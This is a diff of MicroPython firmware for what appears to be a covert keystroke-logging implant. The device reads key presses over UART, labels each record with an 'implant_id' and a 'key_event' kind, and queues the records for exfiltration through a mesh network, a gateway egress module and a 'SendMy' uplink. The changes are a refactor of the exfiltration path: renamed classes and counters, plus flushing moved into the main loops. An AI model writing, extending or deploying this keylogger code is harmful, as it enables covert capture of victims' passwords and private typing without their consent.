@@ -41,7 +41,7 @@ elif settings.mesh_only:
     import asyncio
     from mesh_network import MeshNetwork
     from mesh_store import MeshStore
-    from egress import EgressManager
+    from egress import GatewayEgress
     from sendmy import SendMyQueue
 
     if settings.role not in ("node", "gateway") or not settings.mesh_enabled:
@@ -52,7 +52,7 @@ elif settings.mesh_only:
     sendmy = None
     if settings.role == "gateway":
         mesh_store = MeshStore(settings.mesh_log_path)
-        egress = EgressManager(settings)
+        egress = GatewayEgress(settings)
     elif settings.uplink_sendmy:
         sendmy = SendMyQueue(settings)
 
@@ -70,7 +70,8 @@ elif settings.mesh_only:
         if settings.uplink_mesh:
             mesh.publish_key_event(press)
         if sendmy is not None:
-            sequence = mesh.sequence if settings.uplink_mesh else sendmy.sent + len(sendmy.queue) + 1
+            sequence = (mesh.sequence if settings.uplink_mesh else
+                        sendmy.events_sent + len(sendmy.queue) + 1)
             sendmy.enqueue({
                 "network_id": settings.mesh_network_id,
                 "implant_id": settings.node_id,
@@ -131,7 +132,7 @@ elif settings.mesh_only:
             asyncio.create_task(mesh.run_synthetic_telemetry())
         while True:
             if sendmy is not None:
-                sendmy.flush_one()
+                sendmy.flush_due()
             await asyncio.sleep_ms(1000)
 
     asyncio.run(run_mesh_node())
@@ -163,7 +164,7 @@ else:
     import wifi_radio
     from mesh_network import MeshNetwork
     from mesh_store import MeshStore
-    from egress import EgressManager
+    from egress import GatewayEgress
     from sendmy import SendMyQueue
 
     uart = UART(1, baudrate=115200, tx=Pin(2), rx=Pin(1))
@@ -179,7 +180,7 @@ else:
     if settings.mesh_enabled and settings.role in ("node", "gateway"):
         mesh_store = MeshStore(settings.mesh_log_path)
         if settings.role == "gateway":
-            egress = EgressManager(settings)
+            egress = GatewayEgress(settings)
 
         def on_data(packet, mac):
             record = None
@@ -223,6 +224,8 @@ else:
         last_activity = time.ticks_ms()
 
         while True:
+            if sendmy is not None:
+                sendmy.flush_due()
             if time.ticks_diff(time.ticks_ms(), last_activity) >= 10_000:
                 log._flush()
                 last_activity = time.ticks_ms()
@@ -258,7 +261,7 @@ else:
                     mesh.publish_key_event(press)
                 if sendmy is not None:
                     sequence = (mesh.sequence if settings.uplink_mesh else
-                                sendmy.sent + len(sendmy.queue) + 1)
+                                sendmy.events_sent + len(sendmy.queue) + 1)
                     sendmy.enqueue({
                         "network_id": settings.mesh_network_id,
                         "implant_id": settings.node_id,
@@ -267,7 +270,6 @@ else:
                         "kind": "key_event",
                         "value": press,
                     })
-                    sendmy.flush_one()
             last_activity = time.ticks_ms()
 
     asyncio.run(main())
